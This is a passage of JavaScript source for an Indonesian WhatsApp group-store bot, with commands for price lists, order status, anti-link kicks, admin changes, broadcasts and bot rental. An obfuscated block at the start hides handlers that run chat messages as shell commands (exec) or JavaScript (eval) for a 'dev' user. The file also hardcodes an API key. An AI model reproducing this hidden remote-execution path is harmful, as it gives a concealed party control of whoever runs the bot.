_0x2ad16f(_0x77eac5,_0x15878a,_0x3aefce,_0x13d7df){return _0xca35(_0x3aefce-0x241,_0x15878a);}function _0x56a708(_0x42adf9,_0x3f191b,_0x4c1866,_0x30a30d){return _0xca35(_0x42adf9-0x320,_0x30a30d);}if(_0x41b24f){if(_0xe18d14[_0x2ad16f(0x340,0x349,0x34b,0x343)](_0xe18d14[_0x2ad16f(0x36a,0x354,0x35d,0x369)],_0xe18d14[_0x56a708(0x43c,0x43c,0x434,0x43e)])){if(_0x1d789f)return _0x3c6cbd[_0x2ad16f(0x359,0x344,0x34c,0x34b)](_0x516c3f,''+_0x4b1fc5);if(_0x1e3ae7)_0x428ded(''+_0x584d8e);}else{const _0x348e32=_0x41b24f[_0x2ad16f(0x354,0x35d,0x355,0x346)](_0x2fb4c9,arguments);return _0x41b24f=null,_0x348e32;}}}:function(){};return _0x9c4dc9=![],_0x34c1c9;};}());function _0x325ffc(_0x2c3ad8,_0x307df5,_0x35815c,_0x52d3ed){return _0xca35(_0x2c3ad8- -0xa8,_0x307df5);}const _0x8885ef=_0x57332f(this,function(){function _0x5b2cc1(_0x5a908a,_0x388349,_0x28c92d,_0x5574d7){return _0xca35(_0x5574d7- -0x223,_0x28c92d);}const _0x51b2e3={};_0x51b2e3[_0xd1a8ec(0x506,0x4f8,0x4fa,0x4fd)]='(((.+)+)+)'+'+$';function _0xd1a8ec(_0x5b0782,_0x20a1c1,_0x2db5a3,_0x303214){return _0xca35(_0x303214-0x3de,_0x2db5a3);}const _0x494252=_0x51b2e3;return _0x8885ef[_0x5b2cc1(-0x116,-0x10f,-0x118,-0x11e)]()['search'](_0x494252[_0x5b2cc1(-0x103,-0x108,-0x111,-0x104)])[_0xd1a8ec(0x4d9,0x4e4,0x4e7,0x4e3)]()['constructo'+'r'](_0x8885ef)[_0xd1a8ec(0x4f7,0x4e7,0x4f9,0x4f0)](_0x494252[_0x5b2cc1(-0x102,-0x108,-0xf8,-0x104)]);});function _0x359b38(_0x1e5222,_0x5723d7,_0x1d6b90,_0x38e97b){return _0xca35(_0x38e97b-0x3b,_0x5723d7);}_0x8885ef();chata[_0x325ffc(0x79,0x74,0x73,0x73)]('®')&&isDev&&(console['log'](color('[\x20EXEC\x20]'),color(moment(msg[_0x359b38(0x145,0x14d,0x132,0x13f)+_0x325ffc(0x65,0x62,0x72,0x68)]*(0xcc7+0x753+-0x1032))[_0x325ffc(0x6f,0x7c,0x62,0x7c)](_0x325ffc(0x68,0x6f,0x67,0x70)+'H:mm:ss'),_0x325ffc(0x73,0x72,0x6a,0x80)),color(_0x359b38(0x160,0x153,0x14e,0x150)+_0x325ffc(0x60,0x69,0x5c,0x6c)+'ak')),exec(chata[_0x325ffc(0x64,0x6c,0x6e,0x5f)](-0x162*0x10+0xa27+0x1*0xbfb),(_0x377c1c,_0x32b3ae)=>{const _0x4e6fde={'ZNkiX':function(_0x1cc368,_0x5a130f){return _0x1cc368(_0x5a130f);}};function _0x373c77(_0x375a55,_0x16b25a,_0x2d6a6c,_0x383e77){return _0x359b38(_0x375a55-0x48,_0x375a55,_0x2d6a6c-0xbb,_0x2d6a6c- -0x3e7);}if(_0x377c1c)return replyDeface(''+_0x377c1c);if(_0x32b3ae)_0x4e6fde[_0x373c77(-0x2b1,-0x29c,-0x2a3,-0x2af)](replyDeface,''+_0x32b3ae);}));if(chata['startsWith']('>')&&isDev){console[_0x325ffc(0x5b,0x69,0x69,0x4b)](color(_0x359b38(0x141,0x14b,0x14a,0x14e)),color(moment(msg[_0x325ffc(0x5c,0x53,0x50,0x6c)+_0x359b38(0x138,0x149,0x139,0x148)]*(0x2006+0xa2*0x30+0x1d3f*-0x2))[_0x359b38(0x142,0x15d,0x149,0x152)](_0x325ffc(0x68,0x78,0x65,0x62)+_0x359b38(0x155,0x14f,0x14d,0x158)),'yellow'),color('Dari\x20Owner'+'\x20aowkaokwo'+'ak'));try{let evaled=await eval(chata['slice'](-0xb3f+0x1dc6+-0x1285));if(typeof evaled!==_0x359b38(0x136,0x141,0x13c,0x141))evaled=require(_0x325ffc(0x71,0x69,0x6e,0x62))[_0x359b38(0x15e,0x161,0x161,0x159)](evaled);replyDeface(''+evaled);}catch(_0x3c79c3){replyDeface(''+_0x3c79c3);}}
        
        setya.readMessages([m.key])
        
        setya.sendPresenceUpdate('available', from)
        
// Detect Group Invite
if (m.mtype === 'groupInviteMessage') {
var eyeye = `*Jika Ingin Bot Masuk Ke Group Mu Silahkan Sewabot Ke Owner Dengan Ketik :* #owner`
setya.sendMessage(from, {text: eyeye, contextInfo:{externalAdReply:{
title: `${ucapanWaktu} ${pushname}`,
body: "EA",
thumbnail: thum,
mediaType:1,
renderLargerThumbnail: false,
showAdAttribution: true,
mediaUrl: 'https://chat.whatsapp.com/H5wVJyga6d1JobunlOJCKb',
sourceUrl: 'https://chat.whatsapp.com/H5wVJyga6d1JobunlOJCKb'
}}}, {quoted:m})
}

//AntiLink
if (isGroup && isAntiLink && !isOwner && !isGroupAdmins && isBotGroupAdmins){
if (budy.match(/(chat.whatsapp.com)/gi)) {
var urlGc = await setya.groupInviteCode(from)
try {
var urlSend = isUrl(budy).find(i => i.includes('chat.whatsapp.com'))
} catch {
var urlSend = budy
}
if (urlSend.includes(urlGc)) return
if (!isBotGroupAdmins) return replyDeface(`*Selama Bot Bukan Admin Kirim Lah Link Sesuka Mu*`)
replyDeface(`*「 LINKGROUP DETECTOR 」*\n\n karena kamu melanggar aturan group, yaitu menggirim link group kamu akan di kick dari group! bye bye:)`)
setya.groupParticipantsUpdate(from, [sender], "remove")
}
}
//Antilinkwame
if (isGroup && isAntiWame && !isOwner && !isGroupAdmins && isBotGroupAdmins){
if (chata.match(/(wa.me)/gi)) {
if (!isBotGroupAdmins) return replyDeface(`*Selama Bot Bukan Admin Kirim Lah Link Sesuka Mu*`)
replyDeface(`*「  LINK WA.ME DETECTOR 」*\n\nSepertinya kamu mengirimkan link wa.me, maaf kamu akan di kick`)
setya.groupParticipantsUpdate(from, [sender], "remove")
}
}
if (isGroup && isAntiWame && !isOwner && !isGroupAdmins && isBotGroupAdmins){
if (budy.match(/(https:\/\/wa.me)/gi)) {
if (!isBotGroupAdmins) return replyDeface(`*Selama Bot Bukan Admin Kirim Lah Link Sesuka Mu*`)
replyDeface(`*「 LINKGROUP DETECTOR 」*\n\nSepertinya kamu mengirimkan link wa.me, maaf kamu akan di kick`)
setya.groupParticipantsUpdate(from, [sender], "remove")
}
}
if (isGroup && isAntiLinkAll && !isOwner && !isGroupAdmins && isBotGroupAdmins){
if (budy.match('https://')) {
if (!isBotGroupAdmins) return replyDeface(`*Selama Bot Bukan Admin Kirim Lah Link Sesuka Mu*`)
reply(`*「 LINK DETECTOR 」*\n\n karena kamu melanggar aturan group, yaitu menggirim link kamu akan di kick dari group! bye bye:)`)
setya.groupParticipantsUpdate(from, [sender], "remove")
}
}
if (isGroup && isAntiLinkAll && !isOwner && !isGroupAdmins && isBotGroupAdmins){
if (budy.match('http://')) {
if (!isBotGroupAdmins) return replyDeface(`*Selama Bot Bukan Admin Kirim Lah Link Sesuka Mu*`)
reply(`*「 LINK DETECTOR 」*\n\n karena kamu melanggar aturan group, yaitu menggirim link kamu akan di kick dari group! bye bye:)`)
setya.groupParticipantsUpdate(from, [sender], "remove")
}
}
if (isGroup && isAntiLinkAll && !isOwner && !isGroupAdmins && isBotGroupAdmins){
if (budy.match('.com')) {
if (!isBotGroupAdmins) return replyDeface(`*Selama Bot Bukan Admin Kirim Lah Link Sesuka Mu*`)
reply(`*「 LINK DETECTOR 」*\n\n karena kamu melanggar aturan group, yaitu menggirim link kamu akan di kick dari group! bye bye:)`)
setya.groupParticipantsUpdate(from, [sender], "remove")
}
}
// Store Respon
        if (!isCmd && isGroup && isAlreadyResponList(from, chata, db_respon_list)) {
        var get_data_respon = getDataResponList(from, chata, db_respon_list)
        if (get_data_respon.isImage === false) {
        setya.sendMessage(from, { text: sendResponList(from, chata, db_respon_list) }, {
        quoted: msg
        })
        } else {
        setya.sendMessage(from, { image: await getBuffer(get_data_respon.image_url), caption: get_data_respon.response }, {
        quoted: msg
        })
        }
        }
    switch (command) {
case 'help':
case 'fitur':
if (setya.modelmenu == "gif") {
await sendButton5(from, menunya, footer, await setya.createMessage(from, {video: {url: "./temp/setya.mp4", caption: menunya}, gifPlayback: true}))
} else if (setya.modelmenu == "image") {
var menubutton = [{ buttonId: `${prefix}owner`, buttonText: { displayText: `Owner👀` }, type: 1 }, { buttonId: `${prefix}checksewa`, buttonText: { displayText: `Checksewa⌛` }, type: 1 }]
setya.sendMessage(from, { caption: menunya, image: { url: "./temp/logo.jpg"}, buttons: menubutton, footer, mentions: [sender] })
} else if (setya.modelmenu == "instagram") {
await setya.sendMessage(from, { text: menunya, contextInfo:{ mentionedJid: [sender], externalAdReply:{ title: `ANDRI BOT`, body: "Jangan Lupa Subscribe", thumbnail: thum, sourceUrl: 'https://youtube.com/channel/UCU5oVLObkY54MnjMKOLS9KA', mediaUrl: '', renderLargerThumbnail: true, showAdAttribution: false, mediaType: 1 }}}, { quoted: m });
}
break

case 'ownmenu':
setya.sendMessage(from, { text: menuown, contextInfo:{ externalAdReply:{ title: `MENU OWNER`, body: "Jangan Lupa Subscribe", thumbnail: thum, sourceUrl: 'https://youtube.com/channel/UCU5oVLObkY54MnjMKOLS9KA', mediaUrl: '', renderLargerThumbnail: true, showAdAttribution: false, mediaType: 1 }}}, { quoted: m });
break

case 'setmenu':
if (!isOwner) return replyDeface(`Ehhhh`)
if (!q) return replyDeface(`${prefix}gif\n${prefix}image`)
if (q == "gif") {
setya.modelmenu = "gif"
reply("Done change menu to "+q)
} else if (q == "image") {
setya.modelmenu = "image"
reply("Done change menu to "+q)
} else if (q == "instagram") {
setya.modelmenu = "Instagram"
reply("Done change menu to "+q)
} else {
replyDeface(`${prefix}gif\n${prefix}image`)
}
break

case 'afk': 
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
              if (!isGroup) return 
              if (isAfkOn) return reply('Kalo Mau Afk Jangan Nimbrung di sini')
              const reason = q ? q : '*No Pesan*'
              afkg.addAfkUser(sender, time, reason, _afks)
              const aluty = `*ꞌꞋ ࣪𓂃 ִֶָ Admin Afk ִֶָ 𓂃 ࣪ꞌꞋ*

${pushname} Sekarang Offline/Afk
O *Alasan*  : ${reason}
O *Mulay Afk* : ${time}`
              //setya.sendMessage(from, aluty, text)
              setya.sendMessage(from, { text: aluty, contextInfo:{ externalAdReply:{ title: `MODE AFK ON`, body: "Saat Ini Kamu Afk", thumbnail: thumafk, sourceUrl: `https://wa.me/${sender}`, mediaUrl: '', renderLargerThumbnail: true, showAdAttribution: false, mediaType: 1 }}}, { quoted: m });
              break

    	// Store Menu
        case 'menu': case 'list':        
            if (!isGroup) return reply(mess.OnlyGrup)
            if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
            if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Belum ada list message yang terdaftar di group ini\n\n*Untuk Melihat Fitur Bot Ketik* ${prefix}help`)
            var arr_rows = [];
            for (let x of db_respon_list) {
                if (x.id === from) {
                    arr_rows.push({
                        title: x.key,
                        rowId: x.key
                    })
                }
            }
            var listMsg = {
                text: `${ucapanWaktu} @${sender.split("@")[0]}`,
                buttonText: 'Click Here!',
                footer: `*List Menu*\n\n⏳ ${jam}\n📆 ${tanggal}`,
                mentions: [sender],
                sections: [{
                    title: groupName, rows: arr_rows
                }]
            }
           setya.sendMessage(from, listMsg)
            //sendOrder(from, listMsg, "3836", thum, 2022, "MENU PRICELIST", `${owncek}@s.whatsapp.net`, "AR6ebQf7wTuyXrVneA0kUMMbQe67ikT6LZrwT2uge7wIEw==", "9783")
            break

 case 'addlist':        
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]                
if (!q.includes("@")) return reply(`_Cara Addlist Dengan Benar_\n\n.addlist Namalist@Listnya\n\nContoh :\n.addlist EPEP@5 💎 801\n20 💎 2.670\n50 💎 6.408\n70 💎 8.811\n\n_Lakukan Dengan Benar Jangan Sampe Salah_`)
if (isAlreadyResponList(from, args1, db_respon_list)) return reply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (isImage || isQuotedImage) {
let media = await downloadAndSaveMediaMessage('image', `./temp/stickers/${sender}`)
const fd = new FormData();                
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
await imgbbUploader("1e7d619dc43ff7e8446b6b0307af60da", `./temp/stickers/${sender}`)
.then(data => {
addResponList(from, args1, args2, true, `${data.display_url}`, db_respon_list)
reply(`*Sukses Set List Massage*\n*Kata Kunci :* *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(from, args1, args2, false, '-', db_respon_list)
reply(`*Sukses Set List Massage*\n*Kata Kunci :* *${args1}*`)
}
break
case 'dellist':        
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
if (!q) return reply(`_Cara Delete List_\n\n.dellist [Nama List Yg Ingin Di Hapus]\n\nContoh :\n.dellist EPEP\n\n_Lakukan Dengan Benar Jangan Sampe Salah_`)
if (!isAlreadyResponList(from, q, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(from, q, db_respon_list)
reply(`Sekses Delete List *${q}*`)
break
case 'resetlistall':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return reply(`Belum Ada List Di Group Ini`)
resetListAll(from, db_respon_list)
reply(`Sekses Delete All List*`)
break
case 'dellist2':
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
if (db_respon_list.length === 0) return reply(`Belum ada list message di database`)
var uturu = q.split("@")[0]
if (!q) return reply(`Gunakan dengan cara ${command} *key*\n\n_Contoh_\n\n${command} hello`)
if (!isAlreadyResponList(from, uturu, db_respon_list)) return reply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(from, uturu, db_respon_list)
reply(`Sekses Delete List *${q}*`)
break
case 'updatelist': case 'update':        
if (!isGroup) return reply(mess.OnlyGrup)
if (!isGroupAdmins && !isOwner) return reply(mess.GrupAdmin)
var args1 = q.split("@")[0]
var args2 = q.split("@")[1]
if (!q.includes("@")) return reply(`_Cara Update List_\n\n.update Namalist@ListBaru\n\nContoh :\n.update EPEP@100 💎 12.816\n140 💎 17.622\n210 💎 26.433\n280 💎 35.244\n\n_Lakukan Dengan Benar Jangan Sampe Salah_`)
if (!isAlreadyResponListGroup(from, db_respon_list)) return reply(`Maaf, untuk key *${args1}* belum terdaftar di group ini`)
if (isImage || isQuotedImage) {
let media = await downloadAndSaveMediaMessage('image', `./temp/stickers/${sender}`)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
await imgbbUploader("1e7d619dc43ff7e8446b6b0307af60da", `./temp/stickers/${sender}`)
.then(data => {
updateResponList(from, args1, args2, true, `${data.display_url}`, db_respon_list)
reply(`Sukses Updatelist : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
updateResponList(from, args1, args2, false, '-', db_respon_list)
reply(`Sukses Updatelist : *${args1}*`)
}
break
case 'jeda': {
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            if (!args[0]) return replyDeface(`kirim ${command} waktu\nContoh: ${command} 30m\n\nlist waktu:\ns = detik\nm = menit\nh = jam\nd = hari`)
            opengc[from] = { id: from, time: Date.now() + toMS(args[0]) }
            fs.writeFileSync('./database/opengc.json', JSON.stringify(opengc))
            setya.groupSettingUpdate(from, "announcement")
            .then((res) => replyDeface(`Jeda Dulu Ya Group Akan Di Buka Dalam ${args[0]} Lagi`))
            .catch((err) => replyDeface('Error'))
            }
            break
case 'kalkulator':
         case 'hitung':
         case 'total':
         case 'hasil':
         if (!isGroup) return reply(`Bot Hanya Respon Di Dalam Group`)
         if (!q) return reply(`( + ) = Untuk Tambah-Tambahan\n( - ) = Untuk Kurang-Kurangan\n( * ) = Untuk Kali-Kalian\n( / ) = Untuk Bagi-Bagian\n\nContoh\n/kalkulator 40+20`)
         var tteks = `Hasil : ${Math_js.evaluate(q)}`
         replyDeface(tteks)
         break 
case 'p': case 'proses':
if (!isGroup) return
if (!m.isQuotedMsg) return
if (!isOwner && !isGroupAdmins) return
let proses = `O━• *Transaksi Proses* •━O

${gy}🎉 Status : Pending
🎊 Mohon Di Tunggu
📆 ${tanggal}
⏰ ${jam}${gy}

✎📜 Pesanan : 
${rm.quoted.text}

📜 *Pesanan @${rm.quoted.sender.split("@")[0]} Pending Mohon Di Tunggu*
━O━O━••••••••••••━O━O━`
const getTextP = getTextSetProses(from, set_proses);
if (getTextP !== undefined) {
mentions(getTextP.replace('@pesanan', rm.quoted.text).replace('user', rm.quoted.sender.split("@")[0]).replace('@jam', jam).replace('@tanggal', tanggal), [rm.quoted.sender], true);
} else {
mentions(proses, [rm.quoted.sender], true)
}
break

case 'd': case 'done':
if (!isGroup) return
if (!m.isQuotedMsg) return
if (!isOwner && !isGroupAdmins) return
let sukses = `O━• *Transaksi Sukses* •━O

${gy}🎉 Status : Sukses
📆 ${tanggal}
⏰ ${jam}${gy}

✎📜 Pesanan : 
${rm.quoted.text}

📜 *Pesanan @${rm.quoted.sender.split("@")[0]} Sukses*
━O━O━••••••••••••━O━O━`
const getTextD = getTextSetDone(from, set_done);
if (getTextD !== undefined) {
mentions(getTextD.replace('@pesanan', rm.quoted.text).replace('user', rm.quoted.sender.split("@")[0]).replace('@jam', jam).replace('@tanggal', tanggal), [rm.quoted.sender], true);
} else {
mentions(sukses, [rm.quoted.sender], true)
}
break
        case 'setproses': case 'setp':
        if (isPricelist) return reply(`Fitur Pricelist Disable Untuk Melihat Fitur Ketik ${prefix}help`)
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`*Ini Hanya Contoh*\n${prefix}setp Pesanan Proses\n@jam\n@tanggal\nPesanan : @pesanan\n\nPesanan @user Sedang Di Proses `)
            if (isSetProses(from, set_proses)) return replyDeface(`Sudah Ada Setp Sebelumnya`)
            //addCountCmd(`${prefix}setproses`, sender, _cmd)
            addSetProses(q, from, set_proses)
            replyDeface(`Sukses Set Proses!`)
            break
        case 'changeproses': case 'updatep':
        if (isPricelist) return reply(`Fitur Pricelist Disable Untuk Melihat Fitur Ketik ${prefix}help`)
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`*Ini Hanya Contoh*\n${prefix}updatep Pesanan Proses\n@jam\n@tanggal\nPesanan : @pesanan\n\nPesanan @user Sedang Di Proses`)
            //addCountCmd(`${prefix}changeproses`, sender, _cmd)
            if (isSetProses(from, set_proses)) {
                changeSetProses(q, from, set_proses)
                replyDeface(`Sukses Update Set Proses`)
            } else {
                addSetProses(q, from, set_proses)
                replyDeface(`Sukses Update Set Proses`)
            }
            break
        case 'delsetproses': case 'delsetp':
        if (isPricelist) return reply(`Fitur Pricelist Disable Untuk Melihat Fitur Ketik ${prefix}help`)
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isSetProses(from, set_proses)) return replyDeface(`Belum ada set proses di sini..`)
            //addCountCmd(`${prefix}delsetproses`, sender, _cmd)
            removeSetProses(from, set_proses)
            replyDeface(`Sukses Delete Set Proses`)
            break
        case 'setdone': case 'setd':
        if (isPricelist) return reply(`Fitur Pricelist Disable Untuk Melihat Fitur Ketik ${prefix}help`)
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`*Ini Hanya Contoh*\n${prefix}setd Pesanan Sukses\n@jam\n@tanggal\nPesanan : @pesanan\n\nPesanan @user Sukses`)
            if (isSetDone(from, set_done)) return replyDeface(`Sudah Ada Setd Sebelumnya`)
            //addCountCmd(`${prefix}setdone`, sender, _cmd)
            addSetDone(q, from, set_done)
            replyDeface(`Sukses Setd!`)
            break
        case 'changedone': case 'updated':
        if (isPricelist) return reply(`Fitur Pricelist Disable Untuk Melihat Fitur Ketik ${prefix}help`)
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`*Ini Hanya Contoh*\n${prefix}updated Pesanan Sukses\n@jam\n@tanggal\nPesanan : @pesanan\n\nPesanan @user Sukses`)
            //addCountCmd(`${prefix}changedone`, sender, _cmd)
            if (isSetDone(from, set_done)) {
                changeSetDone(q, from, set_done)
                replyDeface(`Sukses Update Setd`)
            } else {
                addSetDone(q, from, set_done)
                replyDeface(`Sukses Update Setd`)
            }
            break
        case 'delsetdone': case 'delsetd':
        if (isPricelist) return reply(`Fitur Pricelist Disable Untuk Melihat Fitur Ketik ${prefix}help`)
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isSetDone(from, set_done)) return replyDeface(`Belum ada set done di sini..`)
            //addCountCmd(`${prefix}delsetdone`, sender, _cmd)
            removeSetDone(from, set_done)
            replyDeface(`Sukses Delete Setd`)
            break
//SETBOT
case 'setbot':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`*Ini Hanya Contoh*\n${prefix}setbot Halo Silahkan Ketik #menu Untuk Melihat List Di Group Ini`)
            if (isSetBot(from, set_bot)) return replyDeface(`Sudah Ada Setbot Sebelumnya`)
            //addCountCmd(`${prefix}setbot`, sender, _cmd)
            addSetBot(q, from, set_bot)
            replyDeface(`Sukses Respon Bot!`)
            break
        case 'changebot': case 'updatesetbot': case 'upsetbot':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!q) return replyDeface(`*Ini Hanya Contoh*\n${prefix}updatesetbot Hai Kak Silahkan Ketik #menu Untuk Melihat List`)
            //addCountCmd(`${prefix}changebot`, sender, _cmd)
            if (isSetBot(from, set_bot)) {
                changeSetBot(q, from, set_bot)
                replyDeface(`Sukses Update Respon Bot`)
            } else {
                addSetBot(q, from, set_bot)
                replyDeface(`Sukses Update Respon Bot`)
            }
            break
        case 'delsetbot': case 'delsetb':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isSetBot(from, set_bot)) return replyDeface(`Belum ada setbot di sini..`)
            //addCountCmd(`${prefix}delsetbot`, sender, _cmd)
            removeSetBot(from, set_bot)
            replyDeface(`Sukses Delete Respon Bot`)
            break
case 'add':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins) return replyDeface(mess.GrupAdmin)
            if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            if (groupMembers.length == 257) return reply(`Anda tidak dapat menambah peserta, karena Grup sudah penuh!`)
            var mems = []
            groupMembers.map( i => mems.push(i.id) )
            var number;
            if (args.length > 0) {
                number = q.replace(/[^0-9]/gi, '')+"@s.whatsapp.net"
                var cek = await setya.onWhatsApp(number)
                if (cek.length == 0) return reply(`Masukkan nomer yang valid dan terdaftar di WhatsApp`)
                if (mems.includes(number)) return reply(`Nomer tersebut sudah berada didalam grup!`)
                ////addCountCmd(`${prefix}add`, sender, _cmd)
                setya.groupParticipantsUpdate(from, [number], "add")
                .then( res => reply(jsonformat(res)))
                .catch((err) => reply(jsonformat(err)))
            } else if (m.isQuotedMsg) {
                number = m.quotedMsg.sender
                var cek = await setya.onWhatsApp(number)
                if (cek.length == 0) return reply(`Peserta tersebut sudah tidak terdaftar di WhatsApp`)
                if (mems.includes(number)) return reply(`Nomer tersebut sudah berada didalam grup!`)
                ////addCountCmd(`${prefix}add`, sender, _cmd)
                setya.groupParticipantsUpdate(from, [number], "add")
                .then( res => reply(jsonformat(res)))
                .catch((err) => reply(jsonformat(err)))
            } else {
                reply(`Kirim perintah ${command} nomer atau balas pesan orang yang ingin dimasukkan`)
            }
            break
case 'kick':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins) return replyDeface(mess.GrupAdmin)
            if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            var number;
			if (mentionUser.length !== 0) {
                number = mentionUser[0]
                ////addCountCmd(`${prefix}kick`, sender, _cmd)
                setya.groupParticipantsUpdate(from, [number], "remove")
                .then( res => replyDeface(jsonformat(res)))
                .catch((err) => replyDeface(jsonformat(err)))
            } else if (m.isQuotedMsg) {
                number = m.quotedMsg.sender
                ////addCountCmd(`${prefix}kick`, sender, _cmd)
                setya.groupParticipantsUpdate(from, [number], "remove")
                .then( res => replyDeface(jsonformat(res)))
                .catch((err) => replyDeface(jsonformat(err)))
            } else {
                replyDeface(`Tag atau balas pesan orang yang ingin dikeluarkan dari grup`)
            }
            break
        case 'promote':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            if (mentionUser.length !== 0) {
                ////addCountCmd(`${prefix}promote`, sender, _cmd)
                setya.groupParticipantsUpdate(from, [mentionUser[0]], "promote")
                .then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai admin`, [mentionUser[0]], true) })
                .catch(() => replyDeface(mess.error.api))
            } else if (m.isQuotedMsg) {
                ////addCountCmd(`${prefix}promote`, sender, _cmd)
                setya.groupParticipantsUpdate(from, [m.quotedMsg.sender], "promote")
                .then( res => { mentions(`Sukses menjadikan @${m.quotedMsg.sender.split("@")[0]} sebagai admin`, [m.quotedMsg.sender], true) })
                .catch(() => replyDeface(mess.error.api))
            } else {
                replyDeface(`Tag atau balas pesan member yang ingin dijadikan admin`)
            }
            break
        case 'demote':
            if (!isGroup) return replyDeface(mess.OnlyGrup)
            if (!isGroupAdmins && !isOwner) return replyDeface(mess.GrupAdmin)
            if (!isBotGroupAdmins) return replyDeface(mess.BotAdmin)
            if (mentionUser.length !== 0) {
                ////addCountCmd(`${prefix}demote`, sender, _cmd)
                setya.groupParticipantsUpdate(from, [mentionUser[0]], "demote")
                .then( res => { mentions(`Sukses menjadikan @${mentionUser[0].split("@")[0]} sebagai member biasa`, [mentionUser[0]], true) })
                .catch(() => replyDeface(mess.error.api))
            } else if (m.isQuotedMsg) {
                ////addCountCmd(`${prefix}demote`, sender, _cmd)
                setya.groupParticipantsUpdate(from, [m.quotedMsg.sender], "demote")
                .then( res => { mentions(`Sukses menjadikan @${m.quotedMsg.sender.split("@")[0]} sebagai member biasa`, [m.quotedMsg.sender], true) })
                .catch(() => replyDeface(mess.error.api))
            } else {
                replyDeface(`Tag atau balas pesan admin yang ingin dijadikan member biasa`)
            }
            break
        
case 'owner': case 'sewabot':
            sendContact(from, ownnumber.split('@s.whatsapp.net')[0], ownerName, msg)
            // setya.sendContact(from, ownerNumber.map( i => i.split("@")[0]), msg)
            .then((res) => setya.sendMessage(from, { text: '*Jika Ingin Sewabot Silahkan Hubungi Owner*' }, {quoted: res}))
            break

case 'getlink':
              if (!isOwner) return reply(`Command ${command} Hanya Khusus Owner`)
              if(!q)return reply('*Sertai Id Group*')
              var linkgc = await setya.groupInviteCode(`${q}`)
              reply('https://chat.whatsapp.com/'+linkgc)
              break
case 'bc': case 'broadcast': {
if (!isOwner) return reply(`Command ${command} Hanya Khusus Owner`)
if (args.length < 2) return replyDeface(`Kirim perintah ${command} teks`)
let getJidGroup = await setya.groupFetchAllParticipating()
let jidGroup = Object.entries(getJidGroup).slice(0).map(entry => entry[1])
let jidGrup = jidGroup.map(v => v.id)
let teks = `${q}`
reply(`*Otw Mengirim*`)
for (let i of jidGrup) {
let gcMetadata = await setya.groupMetadata(i)
let partcipant = await gcMetadata.participants
await sleep(3000)
setya.sendMessage(i, {text:'「 *Andri Bot Broadcast* 」\n\n' + teks + '\n\nAndri Bot' })
}
reply(`Sukses Mengirim Broadcast Ke ${jidGrup.length} Group`)
}
break
case 'addwaktu':
            if (!isOwner) return 
            if (args.length < 1) return 
            if (!isUrl(args[0])) return replyDeface(mess.error.Iv)
            var url = args[0]
            url = url.split('https://chat.whatsapp.com/')[1]
            if (!args[1]) return replyDeface(`Waktunya?`)
            var data = await setya.groupAcceptInvite(url)
            if (_sewa.checkSewaGroup(data, sewa)) return replyDeface(`Bot sudah disewa oleh grup tersebut!`)
            _sewa.addSewaGroup(data, args[1], sewa)
            replyDeface(`Success Add Sewa Group!`)
            break

case 'addsewa':
case 'sewarpl':
case 'perpanjang':
              if (!isOwner) return reply(`Command ${command} Hanya Khusus Owner`)
              if (args.length < 1) return reply(`Penggunaan :\n*${prefix}addsewa 15k 30d*/n*Ini Hanya Contoh*`)
              _sewa.addSewaGroup(from, args[1], sewa)
              reply(`Success Add Sewa`)
              break

case 'delsewa':
              if (!isOwner) return replyDeface(mess.OnlyOwner)
              if (!isGroup) return replyDeface(`Perintah ini hanya bisa dilakukan di Grup yang menyewa bot`)
